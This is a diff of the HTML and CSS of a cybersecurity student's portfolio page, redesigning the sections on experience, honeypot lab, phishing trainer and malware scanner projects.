+.step.active{border-color:var(--accent);box-shadow:0 0 0 3px var(--accent-soft)}
+.step.done{border-color:var(--sev-low)}
+@media (max-width:760px){.pipe{grid-template-columns:1fr;gap:8px}.step + .step{margin-left:0}.step + .step::before{display:none}}
+.scan-grid{display:grid;grid-template-columns:1.2fr 1fr;gap:0;border-top:1px solid var(--line)}
+.scan-grid > div{padding:14px;min-width:0}
+.scan-grid > div + div{border-left:1px solid var(--line)}
+.scan-grid pre.code{min-height:170px}
+.verdict-badge{display:inline-block;font-family:var(--f-display);font-weight:800;font-stretch:85%;font-size:1.3rem;padding:4px 12px;border-radius:6px}
+.vbar{display:grid;grid-template-columns:90px 1fr 50px;gap:8px;align-items:center;font-size:.8rem;margin-top:6px}
+.vbar .bar i{background:var(--sev-high)}
+.vbar.clean .bar i{background:var(--sev-low)}
+@media (max-width:760px){.scan-grid{grid-template-columns:1fr}.scan-grid > div + div{border-left:0;border-top:1px solid var(--line)}}
+
+/* forensics */
+.case{display:grid;grid-template-columns:1.6fr 1fr}
+.case > div{min-width:0}
+.case-left{border-right:1px solid var(--line)}
+.tl-tools{display:flex;justify-content:space-between;gap:8px;padding:10px 12px;border-bottom:1px solid var(--line);flex-wrap:wrap;align-items:center}
+.tl-tools input{font:inherit;font-size:.84rem;padding:5px 10px;border:1px solid var(--line);border-radius:6px;background:var(--surface);color:var(--ink);min-width:0;width:170px}
+.tl-wrap{overflow-x:auto}
+table.tl{width:100%;border-collapse:collapse;font-size:.83rem;min-width:540px}
+.tl th{text-align:left;font-family:var(--f-mono);font-size:.68rem;text-transform:uppercase;letter-spacing:.07em;color:var(--muted);font-weight:500;padding:9px 12px;border-bottom:1px solid var(--line)}
+.tl td{padding:9px 12px;border-bottom:1px solid var(--line);vertical-align:top}
+.tl tbody tr{cursor:pointer}
+.tl tbody tr:hover{background:var(--surface)}
+.tl tbody tr:focus-visible{outline:2px solid var(--accent);outline-offset:-2px}
+.tl tbody tr.right{background:var(--sev-low-bg)}
+.tl tbody tr.wrong{background:var(--sev-high-bg)}
+.tl td:first-child{font-family:var(--f-mono);font-size:.74rem;white-space:nowrap;font-variant-numeric:tabular-nums}
+.src{font-family:var(--f-mono);font-size:.68rem;padding:2px 7px;border-radius:4px;background:var(--info-bg);color:var(--info);white-space:nowrap}
+.qs{padding:14px;display:grid;gap:10px;align-content:start}
+.q{padding:10px 12px;border:1px solid var(--line);border-radius:8px;background:var(--surface);font-size:.87rem}
+.q.active{border-color:var(--accent);box-shadow:0 0 0 3px var(--accent-soft)}
+.q.solved{border-color:var(--sev-low)}
+.q.solved b::after{content:"  ✓";color:var(--sev-low)}
+.q .ans{display:block;margin-top:6px;color:var(--muted);font-size:.82rem}
+@media (max-width:860px){.case{grid-template-columns:1fr}.case-left{border-right:0;border-bottom:1px solid var(--line)}}
+
+/* seed labs */
+.labgrid{display:grid;grid-template-columns:repeat(2,1fr);gap:10px;padding:14px;align-items:start}
+.lab{border:1px solid var(--line);border-radius:8px;background:var(--surface);min-width:0}
+.lab summary{cursor:pointer;list-style:none;padding:12px 14px;display:grid;grid-template-columns:auto 1fr auto;gap:10px;align-items:center}
+.lab summary::-webkit-details-marker{display:none}
+.lab summary .wk{font-family:var(--f-mono);font-size:.7rem;color:var(--accent)}
+.lab summary b{font-size:.93rem}
+.lab summary .plus{font-family:var(--f-mono);color:var(--muted);transition:transform .2s}
+.lab[open] summary .plus{transform:rotate(45deg)}
+.lab .lb{padding:0 14px 14px;display:grid;gap:8px;font-size:.86rem}
+.lab .lb div b{font-family:var(--f-mono);font-size:.68rem;text-transform:uppercase;letter-spacing:.07em;color:var(--muted);font-weight:500;display:block}
+@media (max-width:760px){.labgrid{grid-template-columns:1fr}}
+
+/* journal */
+.journal{display:grid;gap:14px}
+.j-tools{display:flex;justify-content:space-between;align-items:center;gap:10px;flex-wrap:wrap}
+.j-list{list-style:none;margin:0;padding:0 0 0 22px;position:relative;display:grid;gap:14px}
+.j-list::before{content:"";position:absolute;left:6px;top:6px;bottom:6px;width:2px;background:var(--line)}
+.j-item{position:relative;padding:12px 14px;border:1px solid var(--line);border-radius:8px;background:var(--bg)}
+.j-item::before{content:"";position:absolute;left:-21px;top:16px;width:10px;height:10px;border-radius:50%;background:var(--surface);border:2px solid var(--muted)}
+.j-item[data-k="problem"]::before{border-color:var(--sev-high)}
+.j-item[data-k="fix"]::before{border-color:var(--sev-low);background:var(--sev-low)}
+.j-item[data-k="lesson"]::before{border-color:var(--accent);background:var(--accent)}
+.j-item[data-k="build"]::before{border-color:var(--info)}
+.j-head{display:flex;gap:8px;align-items:center;flex-wrap:wrap;margin-bottom:4px}
+.j-head .when{font-family:var(--f-mono);font-size:.72rem;color:var(--muted)}
+.j-head b{font-size:.95rem}
+.j-item p{font-size:.9rem;max-width:80ch}
+.j-item code{font-family:var(--f-mono);font-size:.8em;background:var(--code-bg);padding:1px 5px;border-radius:3px}
+
+/* process / skills / certs / contact */
+.process{display:grid;grid-template-columns:repeat(5,1fr);gap:14px;counter-reset:s;padding:0;margin:0}
+.process li{list-style:none;counter-increment:s;padding:16px;border-top:3px solid var(--navy);background:var(--surface);border-radius:0 0 8px 8px;min-width:0}
+.process li::before{content:counter(s);font-family:var(--f-display);font-weight:800;font-size:1.6rem;color:var(--accent);display:block;line-height:1;margin-bottom:8px}
+.process b{display:block;margin-bottom:4px}
+.process span{font-size:.88rem;color:var(--muted)}
+@media (max-width:860px){.process{grid-template-columns:1fr 1fr}}
+@media (max-width:480px){.process{grid-template-columns:1fr}}
+.skills{display:grid;grid-template-columns:repeat(2,1fr);gap:18px}
+.skill{background:var(--surface);border:1px solid var(--line);border-radius:var(--radius);padding:20px;min-width:0}
+.skill h3{font-size:1.05rem;margin-bottom:10px}
+.skill .proof{font-size:.84rem;color:var(--muted);margin-top:12px;padding-top:10px;border-top:1px dashed var(--line)}
+.skill .proof a{font-weight:600}
+@media (max-width:760px){.skills{grid-template-columns:1fr}}
+.certs{display:grid;border:1px solid var(--line);border-radius:var(--radius);overflow:hidden;background:var(--surface)}
+.cert{display:grid;grid-template-columns:1fr auto;gap:12px;padding:16px 20px;border-bottom:1px solid var(--line);align-items:center}
+.cert:last-child{border-bottom:0}
+.cert b{display:block}
+.cert span{font-size:.86rem;color:var(--muted);overflow-wrap:anywhere}
+.edu{display:grid;grid-template-columns:1fr 1fr;gap:18px;margin-top:28px}
+.edu > div{background:var(--surface);border:1px solid var(--line);border-radius:var(--radius);padding:20px;min-width:0}
+.edu .when{font-family:var(--f-mono);font-size:.8rem;color:var(--accent)}
+.edu p{font-size:.9rem;color:var(--muted);margin-top:8px}
+@media (max-width:760px){.edu{grid-template-columns:1fr}}
+.contact{background:var(--ink);color:var(--bg);border-radius:14px;padding:40px;display:grid;grid-template-columns:1.3fr 1fr;gap:28px;align-items:center}
+.contact h2{color:var(--bg)}
+.contact p{opacity:.85;margin-top:10px;max-width:52ch}
+.contact .rows{display:grid;gap:10px}
+.crow{display:flex;justify-content:space-between;align-items:center;gap:10px;padding:12px 14px;border:1px solid color-mix(in srgb,var(--bg) 25%,transparent);border-radius:8px;min-width:0}
+.crow span{font-family:var(--f-mono);font-size:.82rem;overflow-wrap:anywhere;min-width:0}
+.crow a{color:var(--bg)}
+.crow button{all:unset;cursor:pointer;font-size:.8rem;font-weight:600;padding:4px 10px;border-radius:5px;background:var(--accent);color:#fff;white-space:nowrap}
+.crow button:focus-visible{outline:2px solid var(--bg)}
+@media (max-width:760px){.contact{grid-template-columns:1fr;padding:24px}}
+footer{padding-block:28px;font-size:.82rem;color:var(--muted)}
+footer .wrap{display:flex;justify-content:space-between;gap:12px;flex-wrap:wrap}
 </style>
 </head>
 <body>
 
-<nav>
-  <div class="nav-brand">~/Romankdk <span>▸ portfolio</span></div>
-  <ul class="nav-links">
-    <li><a href="#about">about</a></li>
-    <li><a href="#experience">experience</a></li>
-    <li><a href="#projects">projects</a></li>
-    <li><a href="#skills">skills</a></li>
-    <li><a href="#contact">contact</a></li>
-  </ul>
-  <div class="status-dot"><span class="dot"></span>open to work</div>
+<nav class="nav" aria-label="Main">
+  <div class="wrap">
+    <a class="brand" href="#top">Y.KHADKA<span>/</span>SOC</a>
+    <ul>
+      <li><a href="#experience">Experience</a></li>
+      <li><a href="#projects">Projects</a></li>
+      <li><a href="#process">Triage process</a></li>
+      <li><a href="#skills">Skills</a></li>
+      <li><a href="#certs">Certifications</a></li>
+      <li><a href="#contact">Contact</a></li>
+    </ul>
+  </div>
 </nav>
 
-<div class="hero">
-  <div class="terminal">
-    <div class="terminal-bar">
-      <div class="btn-r"></div><div class="btn-y"></div><div class="btn-g"></div>
-      <div class="terminal-title">yogendra@khadka: ~/portfolio — bash</div>
-    </div>
-    <div class="terminal-body">
-<span class="ascii"> ██╗   ██╗██╗  ██╗
- ╚██╗ ██╔╝██║ ██╔╝
-  ╚████╔╝ █████╔╝   Yogendra Khadka
-   ╚██╔╝  ██╔═██╗   SOC Analyst · Cybersecurity
-    ██║   ██║  ██╗
-    ╚═╝   ╚═╝  ╚═╝</span>
-
-<div class="line"><span class="prompt">yogendra@portfolio:~$</span><span class="cmd"> whoami</span></div>
-<span class="out-green">▸ SOC Analyst Intern | Cybersecurity Student | CUNY John Jay College</span>
-<span class="sp"></span>
-
-<div class="line"><span class="prompt">yogendra@portfolio:~$</span><span class="cmd"> cat</span><span class="arg"> profile.txt</span></div>
-<span class="out">Name    : Yogendra Khadka</span>
-<span class="out">Role    : GRC & Cybersecurity Intern → SOC Analyst</span>
-<span class="out">School  : CUNY John Jay College of Criminal Justice</span>
-<span class="out">Degree  : B.S. Computer Science & Information Security (2026)</span>
-<span class="out">Based   : New York, NY</span>
-<span class="sp"></span>
-
-<div class="line"><span class="prompt">yogendra@portfolio:~$</span><span class="cmd"> ls</span><span class="arg"> --certs</span></div>
-<span class="out-purple">CompTIA_Security+.cert &nbsp;&nbsp; Google_Cybersecurity_Pro.cert</span>
-<span class="sp"></span>
-
-<div class="line"><span class="prompt">yogendra@portfolio:~$</span><span class="cmd"> grep</span><span class="arg"> -r "impact" ./experience/</span></div>
-<span class="out-dim">DSS/phishing_training.log  → 15,000+ employees trained</span>
-<span class="out-dim">DSS/splunk_dashboards.log  → log analysis for security leadership</span>
-<span class="out-dim">Norwich/security_audit.log → 30% reduction in security incidents</span>
-<span class="sp"></span>
-
-<div class="line"><span class="prompt">yogendra@portfolio:~$</span><span class="cmd"> ./find_internship</span><span class="arg"> --role SOC --location NYC</span></div>
-<span class="out-green">[✓] Scanning opportunities...</span>
-<span class="out-yellow">[!] Actively seeking Summer 2026 internships</span>
-<span class="out-green">[✓] Available immediately</span>
-<span class="sp"></span>
-
-<div class="line"><span class="prompt">yogendra@portfolio:~$</span><span class="cursor"></span></div>
-    </div>
-  </div>
-</div>
-
-<div class="main">
-
-  <section class="section" id="about">
-    <div class="section-header">
-      <span class="section-num">01.</span>
-      <h2 class="section-title">about_me</h2>
-      <div class="section-line"></div>
-    </div>
-    <div class="about-grid">
-      <div class="block">
-        <p class="block-title">// background</p>
-        <p class="about-text">I'm a <strong>cybersecurity student</strong> at CUNY John Jay College focused on <strong>SOC operations and defensive security</strong>. I started at LaGuardia Community College (Dean's List) and transferred to specialize in Information Security.<br><br>My internship at the <strong>NYC Department of Social Services</strong> gave me hands-on exposure to Splunk, GRC, phishing awareness at scale, and AI-driven compliance tooling. I also run a personal <strong>VirtualBox home lab</strong> for continuous practice.</p>
-      </div>
-      <div class="block">
-        <p class="block-title">// certifications & education</p>
-        <div class="cert-row"><span class="cert-icon">★</span><span class="cert-name">CompTIA Security+</span><span class="cert-badge">COMPTIA</span></div>
-        <div class="cert-row"><span class="cert-icon">★</span><span class="cert-name">Google Professional Cybersecurity</span><span class="cert-badge">GOOGLE</span></div>
-        <div class="cert-row"><span class="cert-icon">◆</span><span class="cert-name">B.S. CS & Info Security — John Jay</span><span class="cert-badge">2026</span></div>
-        <div class="cert-row"><span class="cert-icon">◆</span><span class="cert-name">A.S. Computer Science — LaGuardia CC</span><span class="cert-badge">Dean's List</span></div>
-      </div>
-    </div>
-  </section>
-
-  <section class="section" id="experience">
-    <div class="section-header">
-      <span class="section-num">02.</span>
-      <h2 class="section-title">work_experience</h2>
-      <div class="section-line"></div>
-    </div>
-    <div class="exp-item">
+<header class="hero" id="top">
+  <div class="wrap">
+    <div class="hero-grid">
       <div>
-        <p class="exp-date">Jun 2025 – Aug 2025</p>
-        <p class="exp-loc">New York, NY</p>
-      </div>
-      <div>
-        <p class="exp-role">GRC & Cybersecurity Intern</p>
-        <p class="exp-org">NYC Department of Social Services — HQ Office of Security</p>
-        <ul class="exp-bullets">
-          <li>Built phishing awareness training modules for <strong>15,000+ DSS employees</strong> covering phishing, smishing, and incident reporting.</li>
-          <li>Used <strong>Splunk</strong> to analyze email logs and training data — built dashboards for security leadership and flagged non-compliant users.</li>
-          <li>Contributed to the <strong>ANYTHING LLM</strong> project curating datasets and validating AI output for compliance reporting.</li>
-          <li>Coordinated <strong>Azure DevOps</strong> work items supporting security awareness campaign rollouts.</li>
-          <li>Executed internal security assessments, <strong>vulnerability scanning</strong>, and compliance checks using structured frameworks.</li>
-        </ul>
-      </div>
-    </div>
-    <div class="exp-item">
-      <div>
-        <p class="exp-date">Jan 2022 – May 2022</p>
-        <p class="exp-loc">Northfield, VT</p>
-      </div>
-      <div>
-        <p class="exp-role">Student Technician</p>
-        <p class="exp-org">Norwich University — ITS Department</p>
-        <ul class="exp-bullets">
-          <li>Provided IT support to <strong>500+ users</strong> on Windows and Linux, specializing in troubleshooting and system optimization.</li>
-          <li>Reduced security incidents by <strong>30%</strong> through targeted vulnerability scanning and mitigation strategies.</li>
-          <li>Maintained hardware and software inventory through asset tracking and documentation.</li>
-        </ul>
-      </div>
-    </div>
-  </section>
-
-  <section class="section" id="projects">
-    <div class="section-header">
-      <span class="section-num">03.</span>
-      <h2 class="section-title">projects</h2>
-      <div class="section-line"></div>
-    </div>
-    <div class="projects-grid">
-      <div class="project-card">
-        <div class="project-top"><span class="folder">📁</span><a href="https://github.com/Romankdk" target="_blank" class="proj-link">↗ github</a></div>
-        <p class="proj-name">Cloud Security Scanner</p>
-        <p class="proj-desc">Web-based tool for uploading and analyzing suspicious files. Deployed on AWS EC2 with ClamAV malware scanning and VirusTotal API integration. Built report visualizations with Pandas and Matplotlib.</p>
-        <div class="proj-tags"><span class="p-tag">Python</span> · <span class="p-tag">AWS EC2</span> · <span class="p-tag">ClamAV</span> · <span class="p-tag">VirusTotal</span></div>
-      </div>
-      <div class="project-card">
-        <div class="project-top"><span class="folder">📁</span><a href="https://github.com/Romankdk" target="_blank" class="proj-link">↗ github</a></div>
-        <p class="proj-name">VirtualBox Home SOC Lab</p>
-        <p class="proj-desc">Self-hosted Ubuntu lab for practicing Linux sysadmin, networking, and security. Configured Pi-hole for network-wide ad blocking, Jellyfin media server, personal cloud storage, and firewall rules.</p>
-        <div class="proj-tags"><span class="p-tag">Ubuntu</span> · <span class="p-tag">VirtualBox</span> · <span class="p-tag">Pi-hole</span> · <span class="p-tag">Linux</span></div>
-      </div>
-      <div class="project-card">
-        <div class="project-top"><span class="folder">📁</span><a href="https://github.com/Romankdk" target="_blank" class="proj-link">↗ github</a></div>
-        <p class="proj-name">AES Password Manager</p>
-        <p class="proj-desc">Team-built secure password manager with AES encryption for password storage. Focused on application architecture design and security best practices throughout development.</p>
-        <div class="proj-tags"><span class="p-tag">AES Encryption</span> · <span class="p-tag">Python</span> · <span class="p-tag">Security Design</span></div>
-      </div>
-    </div>
-  </section>
-
-  <section class="section" id="skills">
-    <div class="section-header">
-      <span class="section-num">04.</span>
-      <h2 class="section-title">skills_&_tools</h2>
-      <div class="section-line"></div>
-    </div>
-    <div class="skills-grid">
-      <div class="skill-block"><p class="skill-title">SIEM & Monitoring</p><div class="skill-list"><span class="skill-item">Splunk</span><span class="skill-item">Log Analysis</span><span class="skill-item">Dashboard Building</span><span class="skill-item">Alert Triage</span></div></div>
-      <div class="skill-block"><p class="skill-title">Security Ops</p><div class="skill-list"><span class="skill-item">Vulnerability Scanning</span><span class="skill-item">Threat Detection</span><span class="skill-item">Incident Response</span><span class="skill-item">Phishing Analysis</span></div></div>
-      <div class="skill-block"><p class="skill-title">GRC</p><div class="skill-list"><span class="skill-item">Compliance</span><span class="skill-item">Risk Management</span><span class="skill-item">Security Frameworks</span><span class="skill-item">Azure DevOps</span></div></div>
-      <div class="skill-block"><p class="skill-title">Operating Systems</p><div class="skill-list"><span class="skill-item">Linux (Ubuntu)</span><span class="skill-item">Windows</span><span class="skill-item">VirtualBox</span><span class="skill-item">Virtualization</span></div></div>
-      <div class="skill-block"><p class="skill-title">Development</p><div class="skill-list"><span class="skill-item">Python</span><span class="skill-item">AWS EC2</span><span class="skill-item">Pandas / Matplotlib</span><span class="skill-item">VirusTotal API</span></div></div>
-      <div class="skill-block"><p class="skill-title">Networking</p><div class="skill-list"><span class="skill-item">TCP/IP</span><span class="skill-item">Firewall Rules</span><span class="skill-item">Pi-hole / DNS</span><span class="skill-item">Network Tools</span></div></div>
-    </div>
-  </section>
-
-  <section class="section" id="contact">
-    <div class="section-header">
-      <span class="section-num">05.</span>
-      <h2 class="section-title">contact</h2>
-      <div class="section-line"></div>
-    </div>
-    <div class="contact-grid">
-      <div class="contact-terminal">
-        <div class="ct-bar"><div class="btn-r"></div><div class="btn-y"></div><div class="btn-g"></div></div>
-        <div class="ct-body">
-          <a href="mailto:yogendra.khadka@jjay.cuny.edu" class="contact-link"><span class="ck">email</span><span class="cv">yogendra.khadka@jjay.cuny.edu</span></a>
-          <a href="tel:+18022250240" class="contact-link"><span class="ck">phone</span><span class="cv">+1 802-225-0240</span></a>
-          <a href="https://linkedin.com" target="_blank" class="contact-link"><span class="ck">linkedin</span><span class="cv">linkedin.com/in/yogendra-khadka</span></a>
-          <a href="https://github.com/Romankdk" target="_blank" class="contact-link"><span class="ck">github</span><span class="cv">github.com/Romankdk</span></a>
-          <a class="contact-link" style="cursor:default;"><span class="ck">location</span><span class="cv">New York, NY</span></a>
+        <span class="status"><i></i>Open to entry-level SOC Analyst roles</span>
+        <h1>Yogendra Khadka<span class="alias">Roman · Security Operations</span></h1>
+        <p class="lede">I triage alerts, read logs, and write up what happened. I've monitored Splunk SIEM events for an agency with 15,000+ employees, and I run my own SSH honeypot to study real attacker behavior. Every project below has a hands-on demo and a journal of what broke and how I fixed it.</p>
+        <div class="cta">
+          <a class="btn primary" href="Yogendra_Khadka_Resume.pdf" target="_blank" rel="noopener">View resume (PDF)</a>
+          <a class="btn" href="#projects">Try the project labs</a>
+          <a class="btn" href="https://github.com/Romankdk" target="_blank" rel="noopener">GitHub</a>
+          <a class="btn" href="https://www.linkedin.com/in/roman-khadka1/" target="_blank" rel="noopener">LinkedIn</a>
         </div>
       </div>
-      <div class="avail-block">
-        <p class="avail-title">Open to Opportunities</p>
-        <p class="avail-desc">Actively seeking SOC Analyst internships for Summer 2026. Available for full-time roles starting August 2026 upon graduation from CUNY John Jay.</p>
-        <div class="avail-badge"><span class="dot"></span>Available for Internships</div>
+      <aside class="facts" aria-label="Quick facts for recruiters">
+        <div class="facts-head"><b style="font-size:.9rem">Quick facts</b><span class="mono">for recruiters</span></div>
+        <dl>
+          <dt>Target</dt><dd>SOC Analyst I · Cybersecurity Analyst</dd>
+          <dt>Location</dt><dd>New York City (Queens) · on-site or hybrid</dd>
+          <dt>Degree</dt><dd>B.S. Computer Science &amp; Information Security, Dec 2026</dd>
+          <dt>Experience</dt><dd>Cybersecurity Analyst Intern, NYC DSS</dd>
+          <dt>Certs</dt><dd>Google Cybersecurity · Cisco Intro to Cybersecurity · Security+ in progress</dd>
+          <dt>Tools</dt><dd>Splunk, Wireshark, Autopsy, Linux, Python</dd>
+        </dl>
+      </aside>
+    </div>
+
+    <div class="term" aria-label="Interactive terminal">
+      <div class="term-bar"><div class="dots"><i></i><i></i><i></i></div><span>roman@soc-lab: ~ · type a command or tap one below</span></div>
+      <div class="term-out" id="termOut" aria-live="polite"></div>
+      <form class="term-in" id="termForm" autocomplete="off">
+        <label for="termIn">roman@soc-lab:~$</label>
+        <input id="termIn" spellcheck="false" aria-label="Terminal command">
+      </form>
+      <div class="term-chips" id="termChips"></div>
+    </div>
+  </div>
+</header>
+
+<main>
+<section id="experience">
+  <div class="wrap">
+    <div class="sec-head"><span class="eyebrow">Experience</span><h2>Where I've done the work</h2></div>
+    <article class="job">
+      <div class="job-meta"><span class="when">Jun 2025 – Aug 2025</span><span class="where">NYC Department of Social Services<br>New York, NY</span></div>
+      <div>
+        <h3>Cybersecurity Analyst Intern</h3>
+        <ul>
+          <li>Monitored and triaged security events in Splunk SIEM, analyzing email logs and user activity across 15,000+ employees to detect threats and anomalous behavior.</li>
+          <li>Ran vulnerability assessments and security control checks against NIST CSF and NIST SP 800-53, and wrote risk-ranked remediation reports.</li>
+          <li>Analyzed phishing threats and built incident response training modules to reduce human-factor risk.</li>
+          <li>Built Splunk dashboards that turned raw logs into compliance and risk metrics, and presented findings to senior leadership.</li>
+          <li>Tracked remediation work in Azure DevOps and coordinated across teams to close security gaps on schedule.</li>
+          <li>Evaluated AnythingLLM for GRC compliance workflows, checking output accuracy and finding automation use cases.</li>
+        </ul>
+        <div class="tags"><span class="tag">Splunk</span><span class="tag">NIST CSF</span><span class="tag">NIST 800-53</span><span class="tag">Phishing analysis</span><span class="tag">Azure DevOps</span><span class="tag">GRC</span></div>
+      </div>
+    </article>
+    <article class="job">
+      <div class="job-meta"><span class="when">Jan 2022 – May 2022</span><span class="where">Norwich University ITS<br>Northfield, VT</span></div>
+      <div>
+        <h3>Student IT Technician</h3>
+        <ul>
+          <li>Reduced security incidents by 30% through proactive vulnerability scanning and threat mitigation across 500+ Windows and Linux endpoints.</li>
+          <li>Managed user access controls, asset documentation, and system troubleshooting for IT security and compliance.</li>
+        </ul>
+        <div class="tags"><span class="tag">Vulnerability scanning</span><span class="tag">Access control</span><span class="tag">Windows</span><span class="tag">Linux</span></div>
+      </div>
+    </article>
+  </div>
+</section>
+
+<section id="projects">
+  <div class="wrap">
+    <div class="sec-head">
+      <span class="eyebrow">Projects</span>
+      <h2>Hands-on labs you can try yourself</h2>
+      <p>Each project has a <b>Try it</b> tab where you work through the same analysis I do, and a <b>Journal</b> tab with what I built, what broke, and what I learned. Demos use sample data and reserved documentation IP ranges, so nothing exposes a real system.</p>
+    </div>
+    <nav class="pindex" aria-label="Project index">
+      <a href="#p-lab"><span>Home lab</span><b>SOC &amp; Honeypot Lab</b></a>
+      <a href="#p-phish"><span>Internship skill</span><b>Phishing Analysis Trainer</b></a>
+      <a href="#p-scan"><span>Python · AWS</span><b>Cloud Malware Scanner</b></a>
+      <a href="#p-dfir"><span>Forensics</span><b>Windows Artifact Case</b></a>
+      <a href="#p-seed"><span>Capstone II</span><b>SEED Attack Labs</b></a>
+    </nav>
+
+    <!-- 1. HONEYPOT -->
+    <article class="proj" id="p-lab" data-proj="lab">
+      <div class="proj-top">
+        <div><span class="eyebrow">Home lab · Raspberry Pi</span><h3>Home SOC &amp; Honeypot Lab</h3>
+          <p>A Raspberry Pi that works as a small security operations center for my home network. It baits attackers with a fake SSH server, filters DNS, watches traffic, and sends everything to one dashboard.</p></div>
+        <span class="pill on">Ongoing</span>
+      </div>
+      <div class="three">
+        <div><h4>Problem</h4><p>Tutorials don't show real attacker behavior. I wanted live data to practice detection and triage on.</p></div>
+        <div><h4>Built</h4><p>Cowrie SSH honeypot, Pi-hole DNS sinkhole, ntopng traffic monitoring, and Grafana dashboards on a Raspberry Pi.</p></div>
+        <div><h4>Skills shown</h4><p>Log analysis, IOC extraction, MITRE ATT&amp;CK mapping, network segmentation, Linux administration.</p></div>
+      </div>
+      <div class="tabs" role="tablist"><button role="tab" data-t="try">Try it: triage the alert queue</button><button role="tab" data-t="arch">Architecture</button><button role="tab" data-t="journal">Journal<span class="count"></span></button></div>
+
+      <div role="tabpanel" data-p="try">
+        <div class="demo">
+          <div class="demo-bar"><b>SOC console · honeypot alert queue</b><span class="sample">sample events</span></div>
+          <div class="howto"><b>Your shift:</b> open each alert, read the raw log, and mark it <b>True positive</b> or <b>Benign</b>. Every true positive lights up the attacker's path across MITRE ATT&amp;CK and adds its IOCs. Triage all 7 to generate the incident report.</div>
+          <div class="console">
+            <div class="queue">
+              <div class="queue-tools"><div class="chips" id="qFilter"></div><span class="mono muted" id="qProg" style="font-size:.74rem"></span></div>
+              <ul id="qList" role="listbox" aria-label="Alert queue"></ul>
+            </div>
+            <div class="detail" id="qDetail" aria-live="polite"></div>
+          </div>
+          <div class="attack" id="attack" aria-label="MITRE ATT&CK tactics observed"></div>
+          <div class="console-foot">
+            <div><h4>IOCs collected</h4><div class="ioc" id="iocList"><span class="muted" style="border:0;background:none">None yet. Mark true positives to extract indicators.</span></div></div>
+            <div><h4>Shift progress</h4><div class="bar"><i id="qBar"></i></div><div style="margin-top:10px"><button class="btn sm" id="qReport" disabled>Generate incident report</button> <button class="btn sm" id="qReset">Reset</button></div></div>
+          </div>
+          <div class="report-box" id="qReportBox" hidden></div>
+        </div>
+      </div>
+
+      <div role="tabpanel" data-p="arch" hidden>
+        <div class="demo">
+          <div class="demo-bar"><b>Lab architecture</b><span class="sample">diagram</span></div>
+          <div class="diagram">
+            <svg viewBox="0 0 760 230" role="img" aria-label="Internet traffic hits the router, which forwards SSH to a Cowrie honeypot on a Raspberry Pi. Pi-hole handles DNS for home devices, ntopng monitors traffic, and all logs feed Grafana.">
+              <defs><marker id="ar" viewBox="0 0 10 10" refX="9" refY="5" markerWidth="7" markerHeight="7" orient="auto"><path d="M0,0 L10,5 L0,10 z" fill="var(--muted)"/></marker></defs>
+              <g fill="var(--surface)" stroke="var(--line)" stroke-width="1.5">
+                <rect x="10" y="85" width="120" height="60" rx="8"/><rect x="180" y="85" width="120" height="60" rx="8"/>
+                <rect x="360" y="10" width="200" height="210" rx="10" stroke="var(--accent)" stroke-dasharray="5 4" fill="var(--bg)"/>
+                <rect x="372" y="35" width="176" height="40" rx="6"/><rect x="372" y="95" width="176" height="40" rx="6"/><rect x="372" y="155" width="176" height="40" rx="6"/>
+                <rect x="620" y="85" width="130" height="60" rx="8"/><rect x="180" y="170" width="120" height="44" rx="8"/>
+              </g>
+              <text x="70" y="112" text-anchor="middle" font-size="13">Internet</text><text x="70" y="130" text-anchor="middle" font-size="10" class="sub">scanners, bots</text>
+              <text x="240" y="112" text-anchor="middle" font-size="13">Router</text><text x="240" y="130" text-anchor="middle" font-size="10" class="sub">port 22 → Pi</text>
+              <text x="460" y="28" text-anchor="middle" font-size="10" style="fill:var(--accent)">RASPBERRY PI · ISOLATED</text>
+              <text x="460" y="60" text-anchor="middle" font-size="12">Cowrie SSH honeypot</text>
+              <text x="460" y="120" text-anchor="middle" font-size="12">Pi-hole DNS sinkhole</text>
+              <text x="460" y="180" text-anchor="middle" font-size="12">ntopng traffic monitor</text>
+              <text x="685" y="112" text-anchor="middle" font-size="13">Grafana</text><text x="685" y="130" text-anchor="middle" font-size="10" class="sub">dashboards</text>
+              <text x="240" y="196" text-anchor="middle" font-size="12">Home devices</text>
+              <g stroke="var(--muted)" stroke-width="1.5" fill="none" marker-end="url(#ar)">
+                <path d="M130 115 H176"/><path d="M300 105 C335 105 345 55 368 55"/><path d="M300 192 C340 192 345 115 368 115"/><path d="M300 125 C340 125 345 175 368 175"/>
+                <path d="M548 55 C585 55 590 105 616 105"/><path d="M548 115 H616"/><path d="M548 175 C585 175 590 125 616 125"/>
+              </g>
+            </svg>
+          </div>
+        </div>
+      </div>
+      <div role="tabpanel" data-p="journal" hidden><div class="journal" data-journal="lab"></div></div>
+    </article>
+
+    <!-- 2. PHISHING -->
+    <article class="proj" id="p-phish" data-proj="phish">
+      <div class="proj-top">
+        <div><span class="eyebrow">From my internship at NYC DSS</span><h3>Phishing Analysis Trainer</h3>
+          <p>At NYC DSS I analyzed reported emails and turned the patterns into staff training. This trainer walks you through the same checks on three emails: one phish, one legitimate message, and one business email compromise.</p></div>
+        <span class="pill done">Interactive</span>
+      </div>
+      <div class="tabs" role="tablist"><button role="tab" data-t="try">Try it: analyze 3 emails</button><button role="tab" data-t="journal">Journal<span class="count"></span></button></div>
+      <div role="tabpanel" data-p="try">
+        <div class="demo">
+          <div class="demo-bar"><b>Reported-email queue</b><span class="sample">sample emails · fictional orgs</span></div>
+          <div class="howto"><b>How it works:</b> 1. Click any part of the email you want to inspect: sender, headers, links, wording, attachment. 2. When you're ready, pick a verdict. 3. See the response playbook. Not every email is malicious, so watch for false positives.</div>
+          <div class="inbox-steps" id="phTabs"></div>
+          <div class="phish">
+            <div class="email" id="phEmail"></div>
+            <div class="side">
+              <div style="display:flex;justify-content:space-between;align-items:baseline;gap:8px"><h4>Analyst notes</h4><span class="mono muted" id="phCount" style="font-size:.76rem"></span></div>
+              <div class="notes" id="phNotes"></div>
+              <div style="display:flex;gap:8px;flex-wrap:wrap"><button class="btn sm" id="phHint">Give me a hint</button></div>
+              <h4>Your verdict</h4>
+              <div class="verdicts" id="phVerdicts"></div>
+              <div id="phResult" aria-live="polite"></div>
+            </div>
+          </div>
+        </div>
+      </div>
+      <div role="tabpanel" data-p="journal" hidden><div class="journal" data-journal="phish"></div></div>
+    </article>
+
+    <!-- 3. SCANNER -->
+    <article class="proj" id="p-scan" data-proj="scan">
+      <div class="proj-top">
+        <div><span class="eyebrow">Python · AWS EC2 · 2024</span><h3>Cloud Malware Scanner &amp; Threat Intel Platform</h3>
+          <p>A Python service on AWS EC2 that takes a file, hashes it, scans it with ClamAV, checks the hash against VirusTotal, and writes an analyst-ready report with Pandas and Matplotlib charts.</p></div>
